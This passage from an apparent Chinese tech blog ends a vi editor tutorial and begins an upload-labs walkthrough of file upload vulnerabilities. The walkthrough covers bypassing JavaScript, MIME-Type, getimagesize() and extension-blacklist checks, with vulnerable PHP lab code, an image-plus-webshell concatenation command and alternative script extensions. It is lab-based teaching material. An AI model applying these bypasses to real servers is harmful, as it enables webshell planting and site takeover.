<li>可以在  <strong>编辑模式</strong>   下使用  <strong>鼠标右键粘贴</strong></li>
</ul>
<h4 id="4-7-替换"><a href="#4-7-替换" class="headerlink" title="4.7 替换"></a>4.7 替换</h4><table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
<th>工作模式</th>
</tr>
</thead>
<tbody><tr>
<td><strong>r</strong></td>
<td><strong>replace</strong></td>
<td><strong>替换当前字符</strong></td>
<td><strong>命令模式</strong></td>
</tr>
<tr>
<td><strong>R</strong></td>
<td><strong>replace</strong></td>
<td><strong>替换当前光标所在位置向后替换</strong></td>
<td><strong>替换模式</strong></td>
</tr>
</tbody></table>
<ul>
<li><strong>R</strong> 命令可以进入 <strong>替换模式</strong> ， 替换完成后，按下<strong>ESC</strong> 可以回到 <strong>命令模式</strong></li>
<li><strong>替换命令</strong>  的作用就是不用进入  <strong>编辑模式</strong>，对文件进行  <strong>轻量级的修改</strong></li>
</ul>
<p><strong>对文件修改幅度非常小可以用替换命令，否则就要使用 编辑模式 再用ESC退出，效率太慢</strong></p>
<h4 id="4-8-缩排和重复执行"><a href="#4-8-缩排和重复执行" class="headerlink" title="4.8 缩排和重复执行"></a>4.8 缩排和重复执行</h4><table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>&gt;&gt;</strong></td>
<td><strong>向右增加缩进</strong></td>
</tr>
<tr>
<td><strong>&lt;&lt;</strong></td>
<td><strong>想做减少缩进</strong></td>
</tr>
<tr>
<td><strong>.</strong></td>
<td><strong>重复上次命令</strong></td>
</tr>
</tbody></table>
<ul>
<li><p>缩排命令  在开发程序时，通一增加代码的缩进  比较有用！</p>
<ul>
<li>一次性  在选中代码前增加4个空格，就叫做  增加缩进</li>
<li>一次性  在选中代码前删除4个空格，就叫做减少缩进</li>
</ul>
</li>
<li><p>在  可视模式  下，缩排命令需要使用一个 &gt; 或这 &lt;</p>
</li>
</ul>
<blockquote>
<p>在程序中，缩进 通常用来表示代码的归属关系          缩进对于程序开发非常重要</p>
<ul>
<li>前面空格越少，代码的级别越高</li>
<li>前面空格越多，代码的级别越低</li>
</ul>
</blockquote>
<h4 id="4-9-查找"><a href="#4-9-查找" class="headerlink" title="4.9 查找"></a>4.9 查找</h4><p><strong>常规查找</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>/str（内容）</strong></td>
<td><strong>查找 str</strong></td>
</tr>
</tbody></table>
<ul>
<li>查找到指定内容之后，使用 Next  查找下一个出现的位置：<ul>
<li><strong>n：</strong>查找下一个出现的位置</li>
<li><strong>N：</strong>查找上一个出现的位置</li>
</ul>
</li>
<li>如果不想看到的高亮显示，可以随便查找一个文件中不存在的内容即可</li>
</ul>
<p><strong>单词快速匹配</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>*****</td>
<td><strong>向后查找当前目标虽在单词</strong></td>
</tr>
<tr>
<td><strong>#</strong></td>
<td><strong>向前查找当前光标所在单词</strong></td>
</tr>
</tbody></table>
<ul>
<li>在开发中，通过单词快速匹配，可以快速看到这个单词在其他什么位置使用过</li>
</ul>
<h4 id="4-10-查找并替换"><a href="#4-10-查找并替换" class="headerlink" title="4.10 查找并替换"></a>4.10 查找并替换</h4><ul>
<li>在vi中查找和替换命令需要在 <strong>末行模式下</strong> 执行</li>
<li>格式：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ：%s&#x2F;&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>

<h4 id="1-全局替换"><a href="#1-全局替换" class="headerlink" title="1)全局替换"></a>1)全局替换</h4><ul>
<li>一次性替换文件中的 <strong>所有出现的旧文本</strong></li>
<li>格式：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ：%s&#x2F;旧内容&#x2F;新内容&#x2F;g</span><br></pre></td></tr></table></figure>

<h4 id="2）可视区域替换"><a href="#2）可视区域替换" class="headerlink" title="2）可视区域替换"></a>2）可视区域替换</h4><ul>
<li><strong>先选中</strong> 要替换文字的 <strong>范围</strong></li>
<li>格式：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#   :s&#x2F;旧文本&#x2F;新文本&#x2F;g</span><br></pre></td></tr></table></figure>

<h4 id="3）确认替换"><a href="#3）确认替换" class="headerlink" title="3）确认替换"></a>3）确认替换</h4><ul>
<li>如果把末尾的g 改成gc 再替换的时候会有提示  是否替换</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#   ：%s&#x2F;旧文本&#x2F;新文本&#x2F;gc</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>y - yes  替换</strong></li>
<li><strong>n - no   不替换</strong></li>
<li><strong>a - all    替换所有</strong></li>
<li><strong>q - quit  退出替换</strong></li>
<li>l - last  最后一个，并把光标移动到行首</li>
<li>^E  向下滚屏</li>
<li>^Y  向上滚屏</li>
</ol>
<h4 id="4-11-插入命令"><a href="#4-11-插入命令" class="headerlink" title="4.11 插入命令"></a>4.11 插入命令</h4><ul>
<li>编辑模式</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能</th>
<th>常用</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>在当前字符前插入文本</td>
<td>常用</td>
</tr>
<tr>
<td>I</td>
<td>在行首插入文本</td>
<td>较常用</td>
</tr>
<tr>
<td>a</td>
<td>在当前字符后添加文本</td>
<td></td>
</tr>
<tr>
<td>A</td>
<td>在行末添加文本</td>
<td>较常用</td>
</tr>
<tr>
<td>o</td>
<td>在当前行后插入一空行</td>
<td>常用</td>
</tr>
<tr>
<td>O</td>
<td>在当前行前面插入一空行</td>
<td>常用</td>
</tr>
</tbody></table>
<p><strong>重复命令：</strong></p>
<p>随便输入一个 <strong>数字</strong>，</p>
<p>输入  <strong>i  进入编辑模式</strong></p>
<p>输入  你想要<strong>输入的内容</strong></p>
<p>按ESC 返回  命令模式，返回之后会把你要输入的内容重复。</p>
<h5 id="利用-可视块-给多行代码增加注释"><a href="#利用-可视块-给多行代码增加注释" class="headerlink" title="利用  可视块  给多行代码增加注释"></a>利用  可视块  给多行代码增加注释</h5><p>在 Python  中 ，要给代码增加注释，可以在代码前增加一个 #</p>
<p>要实现这个效果可以在  命令模式 下</p>
<ol>
<li>移动到要添加注释的 第一行代码 ， 按^来到行首</li>
<li>按Ctrl+v 进入 可视块 模式</li>
<li>使用 j 向下连续选中要添加的代码行</li>
<li>输入  I  进入 编辑模式，并在 行首插入，注意：一定要使用I</li>
<li>输入 # 也就是注释号</li>
<li>按下  ESC  返回到   命令模式，返回之后 vi  会在之前选中的每一行代码前插入 #</li>
</ol>
<h3 id="0-5分屏命令"><a href="#0-5分屏命令" class="headerlink" title="0.5分屏命令"></a>0.5分屏命令</h3><h4 id="5-1末行命令扩展"><a href="#5-1末行命令扩展" class="headerlink" title="5.1末行命令扩展"></a>5.1末行命令扩展</h4><table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>:e .</strong></td>
<td><strong>edit</strong></td>
<td><strong>会打开内置的文件浏览器，浏览要当前目录下的文件</strong></td>
</tr>
<tr>
<td><strong>:n 文件名</strong></td>
<td><strong>new</strong></td>
<td><strong>新建文件</strong></td>
</tr>
<tr>
<td><strong>:w 文件名</strong></td>
<td><strong>write</strong></td>
<td><strong>另存为，但是仍然编辑当前文件，并不会切换文件</strong></td>
</tr>
</tbody></table>
<p>*<em>:w  命令  如果要阶段性备份的话就可以使用  : w   命令 *</em></p>
<blockquote>
<p>切换文件之前，必须保证当前这个文件已经被保存！</p>
</blockquote>
<p>学习过的  <strong>末行命令：</strong></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>:w</td>
<td>write</td>
<td>保存</td>
</tr>
<tr>
<td>:q</td>
<td>quit</td>
<td>退出，如果没有保存不允许退出</td>
</tr>
<tr>
<td>:q!</td>
<td>quit</td>
<td>强行退出，不保存退出</td>
</tr>
<tr>
<td>:wq</td>
<td>write&amp;quit</td>
<td>保存并退出</td>
</tr>
<tr>
<td>:x</td>
<td></td>
<td>保存并退出</td>
</tr>
<tr>
<td>:%s///gc</td>
<td></td>
<td>确认搜索并替换</td>
</tr>
</tbody></table>
<h4 id="5-2-分屏命令"><a href="#5-2-分屏命令" class="headerlink" title="5.2 分屏命令"></a>5.2 分屏命令</h4><ul>
<li>使用 <strong>分屏命令</strong>，可以  <strong>同时编辑和查看多个文件</strong></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>:sp[文件名]</td>
<td>splip</td>
<td>横向增加分屏</td>
</tr>
<tr>
<td>:vsp[文件名]</td>
<td>vertical split</td>
<td>纵向增加分屏</td>
</tr>
</tbody></table>
<h5 id="1）切换分屏窗口"><a href="#1）切换分屏窗口" class="headerlink" title="1）切换分屏窗口"></a>1）切换分屏窗口</h5><blockquote>
<p>分屏窗口都是基于Ctrl+W这个快捷键的，W对应的英文单词是window</p>
</blockquote>
<table>
<thead>
<tr>
<th>命令</th>
<th>英文</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><strong>W</strong></td>
<td><strong>window</strong></td>
<td><strong>切换到下一个窗口</strong></td>
</tr>
<tr>
<td><strong>r</strong></td>
<td><strong>reverse</strong></td>
<td><strong>互换窗口</strong></td>
</tr>
<tr>
<td><strong>c</strong></td>
<td><strong>close</strong></td>
<td><strong>关闭当前窗口，但是不能关闭最后一个窗口</strong></td>
</tr>
<tr>
<td><strong>q</strong></td>
<td><strong>quit</strong></td>
<td><strong>退出当前窗口，如果是最后一个窗口，则关闭vi</strong></td>
</tr>
<tr>
<td><strong>o</strong></td>
<td><strong>other</strong></td>
<td><strong>关闭其他窗口</strong></td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2020/04/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h4 id="介绍文件上传漏洞"><a href="#介绍文件上传漏洞" class="headerlink" title="介绍文件上传漏洞"></a>介绍文件上传漏洞</h4><p>现在web应用程序，上传文件一种常见功能，为了提高效率，允许用户上传图片，视频，头像和许多其他的文件。然而向用户提供的功能越多，web应用受到攻击的风险就越大，如果web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站权限，或者进一步危害服务器</p>
<h5 id="1、为什么文件上传存在漏洞"><a href="#1、为什么文件上传存在漏洞" class="headerlink" title="1、为什么文件上传存在漏洞"></a>1、为什么文件上传存在漏洞</h5><p>上传文件时，如果服务器代码没有对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件(asp、aspx、php、jsp等格式文件)</p>
<h5 id="2、危害"><a href="#2、危害" class="headerlink" title="2、危害"></a>2、危害</h5><p>非法用户利用文件上传的恶意脚本控制整个网站，甚至控制服务器，这个恶意脚本文件被称为WebShell，也可以称之为”网页后门”，WebShell具有强大功能，比如查看服务器目录，服务器中的文件，执行系统命令等。</p>
<h4 id="文件上传导致的常见安全问题"><a href="#文件上传导致的常见安全问题" class="headerlink" title="文件上传导致的常见安全问题"></a>文件上传导致的常见安全问题</h4><ul>
<li>上传文件是Web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。</li>
<li>上传文件时Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为；</li>
<li>上传文件时病毒、木马文件、黑客用以诱骗用户或者管理者下载执行。</li>
<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本中的浏览器会被作为脚本执行，被用于钓鱼和欺诈</li>
</ul>
<h5 id="文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件"><a href="#文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件" class="headerlink" title="文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件"></a>文件上传漏洞一般是指WebShell能被服务器解析的问题，要完成这个攻击要有几个条件</h5><p>1、上传的文件能被web容器解析并执行，所以文件上传后所在的目录是要在web容器所覆盖的路径</p>
<p>2、用户能够从web上访问这个文件。如果文件上传了，但用户无法通过web访问，或者无法让web容器解析这个脚本，那么也不能称之为漏洞</p>
<p>3、用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功</p>
<h4 id="绕过JS检测验证"><a href="#绕过JS检测验证" class="headerlink" title="绕过JS检测验证"></a>绕过JS检测验证</h4><p>JS检测绕过上传漏洞常见于用户选择文件上传的场景，如果上传文件的后缀不被允许，则会弹窗告知，此时上传文件的数据包并没有发送到服务器端，只是在客户端浏览器使用JavaScript对数据包进行检测。</p>
<p>有两种方法可以绕过客户端JavaScript的检测</p>
<p>1）使用浏览器的插件，删除检测文件后缀的JS代码，然后上传文件即可绕过。</p>
<p>2）先把上传文件的后缀名改为允许上传的，比如：jpg、png、gif等，绕过JS检测，在用BurpSuite抓包，将原本的jpg文件改回php文件</p>
<p>查看界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407135006062.png" alt="image-20200407135006062"></p>
<p>上传php文件看看能否上传，弹出了对话框，这表名验证点在前端，而不是在服务端</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407135530806.png" alt="image-20200407135530806"></p>
<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>判断了验证点在前端，查看JS判断代码，F12找到判断代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140025900.png" alt="image-20200407140025900"></p>
<p>把代码抠出来整理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，上传之前，通过JS判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传</p>
<h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><p>对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传</p>
<p>现将文件名改为可上传格式，使用burp抓包改为php这样就可以绕过了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140430474.png" alt="image-20200407140430474"></p>
<p>查看页面，返回空白图片说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140524961.png" alt="image-20200407140524961"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407140616118.png" alt="image-20200407140616118"></p>
<p>使用第二种方法，删除检查源码进行上传</p>
<p>按F12打开源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141341729.png" alt="image-20200407141341729"></p>
<p>删除红线处的内容onsubmit</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141406254.png" alt="image-20200407141406254"></p>
<p>提交内容，页面返回空白说明正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141521547.png" alt="image-20200407141521547"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407141622318.png" alt="image-20200407141622318"></p>
<p>可以使用菜刀连接</p>
<h4 id="upload-labs第绕过MIME-Type验证"><a href="#upload-labs第绕过MIME-Type验证" class="headerlink" title="upload-labs第绕过MIME-Type验证"></a>upload-labs第绕过MIME-Type验证</h4><h5 id="MIME-Type介绍"><a href="#MIME-Type介绍" class="headerlink" title="MIME-Type介绍"></a>MIME-Type介绍</h5><p><em>MIME</em>(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型，是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式</p>
<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在客户端上传文件时，通过Burp Suite抓取数据包，当上传一个php格式的文件时，可以看到数据包中的 Content-Type的值是application/octet-stream，而上传jpg格式的文件时，数据包中的Content-Type的值是image/jpeg</p>
<p>如果服务器代码使用过Content-Type的值来判断文件的类型，那么就存在被绕过的可能，因为Content-Type的值使用过客户端传递的，是可以任意修改的，所以当传一个php文件的时候，在Burp Suite中将Content-Type修改为image/jpeg就可以绕过服务端的检测</p>
<h5 id="注意：是通过客户端传递，服务端检测，是服务端检测"><a href="#注意：是通过客户端传递，服务端检测，是服务端检测" class="headerlink" title="注意：是通过客户端传递，服务端检测，是服务端检测"></a>注意：是通过客户端传递，服务端检测，是服务端检测</h5><h5 id="验证MIME-Type代码分析"><a href="#验证MIME-Type代码分析" class="headerlink" title="验证MIME-Type代码分析"></a>验证MIME-Type代码分析</h5><p>MIME-Type验证并不是发生在客户端验证，而是发生在服务端验证</p>
<p>// $_FILES表示使用了$_FILES全局数组，主要作用就是进行文件操作，例如文件上传时，使用较多<br>// upload_file是我们上传时的文件，也就是表单当中input-type=file对应有一个name，name属性的值用来接收$_FILES[‘upload_file’]这个文件，来调用第二维可以指定对应的type，来获取上传文件的MIME-Type类型</p>
<p>查看源码分析，使用$_FILE[‘uploda_file’] [‘type’]获取上传文件的MIME-Type类型，其中upload_file是在表中定义的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">&#x2F;&#x2F; 判断文件类型，只有符合image&#x2F;jpeg或者image&#x2F;png才能成功成功上传</span><br><span class="line">        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                $is_upload &#x3D; true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">      &#x2F;&#x2F;当文件类型不是上面判断的类型就会报错</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;文件类型不正确，请重新上传！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR.&#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Burp-Suite绕过MIME-Type验证"><a href="#Burp-Suite绕过MIME-Type验证" class="headerlink" title="Burp Suite绕过MIME-Type验证"></a>Burp Suite绕过MIME-Type验证</h5><p>使用burp抓包，更改Content-type的值</p>
<p>上传php文件Content-type的值是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Type: application&#x2F;octet-stream</span><br></pre></td></tr></table></figure>

<p>需要将Content-Type中的值改为image/jpeg等可以上传的格式</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142209535.png" alt="image-20200407142209535"></p>
<p>查看页面，页面返回空白，说明上传成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142228744.png" alt="image-20200407142228744"></p>
<p>查看根目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407142309837.png" alt="image-20200407142309837"></p>
<p>可以使用菜刀连接</p>
<h5 id="PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize-可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize-就获取不到信息，则不允许上传。"><a href="#PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize-可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize-就获取不到信息，则不允许上传。" class="headerlink" title="PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。"></a>PHP中还存在一种相似的文件上传漏洞，PHP函数getimagesize()可以获取图片的宽、高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。</h5><h5 id="但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令"><a href="#但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令" class="headerlink" title="但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令"></a>但是可以将一个图片和WebShell合并为一个文件。例如使用一下命令</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat image.png wbeshell.php &gt; image.php</span><br></pre></td></tr></table></figure>

<h5 id="此时使用getimagesize-就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize-的限制。"><a href="#此时使用getimagesize-就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize-的限制。" class="headerlink" title="此时使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。"></a>此时使用getimagesize()就可以获取图片信息，且WebShell的后缀是php，也能被Apache解析为脚本文件，通过这种方式就可以绕过getimagesize()的限制。</h5><h4 id="绕过黑名单验证"><a href="#绕过黑名单验证" class="headerlink" title="绕过黑名单验证"></a>绕过黑名单验证</h4><h5 id="基于文件后缀名验证介绍"><a href="#基于文件后缀名验证介绍" class="headerlink" title="基于文件后缀名验证介绍"></a>基于文件后缀名验证介绍</h5><p>对于文件上传模块来说，尽量避免上传可执行的脚本文件。为了防止上传脚本需要设置对应的验证方式。最简单的就是设置文件后缀名验证</p>
<p>基于文件后缀名验证方式的分类：</p>
<p>1、机遇白名单验证：只针对白名单中有的后缀名，文件才能上传成功。</p>
<p>2、基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功</p>
<h5 id="基于黑名单验证代码分析"><a href="#基于黑名单验证代码分析" class="headerlink" title="基于黑名单验证代码分析"></a>基于黑名单验证代码分析</h5><p>对于黑名单中的后缀名筛选。绕过黑名单可以通过寻找”漏网之鱼”，寻找某些可以被作为脚本执行同行也不再黑名单中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 设置了四个黑名单后缀名</span><br><span class="line">        $deny_ext &#x3D; array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span><br><span class="line">    &#x2F;&#x2F; 接收当前上传的文件名</span><br><span class="line">        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">    &#x2F;&#x2F; 接收之后进行并处理</span><br><span class="line">        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br><span class="line">        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);</span><br><span class="line">        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写</span><br><span class="line">        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA</span><br><span class="line">        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空</span><br><span class="line">	&#x2F;&#x2F; 进行判断，如果文件名不在$deny_ext这个黑名单当中，进行上传。</span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">    &#x2F;&#x2F; 上传之后重命名，命名成跟时间以及随机数相关的内容，这样他就不是原名称，而是全新的名称</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR. &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;</span><br><span class="line">                 $img_path &#x3D; $UPLOAD_ADDR .&#39;&#x2F;&#39;. $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span><br><span class="line">                 $is_upload &#x3D; true;</span><br><span class="line">            &#125;</span><br><span class="line">    	&#x2F;&#x2F; 如果在黑名单当值，执行else，不允许上传</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg &#x3D; &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="BurpSuite绕过黑名单验证"><a href="#BurpSuite绕过黑名单验证" class="headerlink" title="BurpSuite绕过黑名单验证"></a>BurpSuite绕过黑名单验证</h5><p>不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他的任意后缀名的文件，比如说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.phtml .phps .php4 .php3</span><br></pre></td></tr></table></figure>

<p>这里黑名单也没有过滤.htaccess，所以也可上传.htaccess后缀的文件进行绕过。</p>
<h6 id="注-htaccess文件生效前提条件为1-mod-rewrite模块开启。2-AllowOverride-All"><a href="#注-htaccess文件生效前提条件为1-mod-rewrite模块开启。2-AllowOverride-All" class="headerlink" title="注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All"></a><em>注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All</em></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</span><br></pre></td></tr></table></figure>

<h5 id="配置文件http-conf"><a href="#配置文件http-conf" class="headerlink" title="配置文件http.conf"></a>配置文件http.conf</h5><p>在Apache中如果需要启动.htaccess，必须在http.conf中设置 AllowOverride</p>
<p>默认情况下红框内会出现None，将None修改为All</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407143520423.png" alt="image-20200407143520423"></p>
<p>这里绕过不使用.htaccess但是提前配置好，使用其他的几个没过滤的文件后缀</p>
<p>使用一下其中一个，当然不止这些扩展名，还有很多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.phtml .phps .php4 .php3</span><br></pre></td></tr></table></figure>

<p>上传php文件使用burp抓包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145002372.png" alt="image-20200407145002372"></p>
<p>将shell.php改为shell.phps</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145030124.png" alt="image-20200407145030124"></p>
<p>Forward放行，页面返回空白图片</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145105478.png" alt="image-20200407145105478"></p>
<p>右键选择复制图片地址在浏览器中打开，成功返回结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200407145158676.png" alt="image-20200407145158676"></p>
<h4 id="绕过黑名单验证-htaccess"><a href="#绕过黑名单验证-htaccess" class="headerlink" title="绕过黑名单验证(.htaccess)"></a>绕过黑名单验证(.htaccess)</h4><p>upload-labs第四关</p>
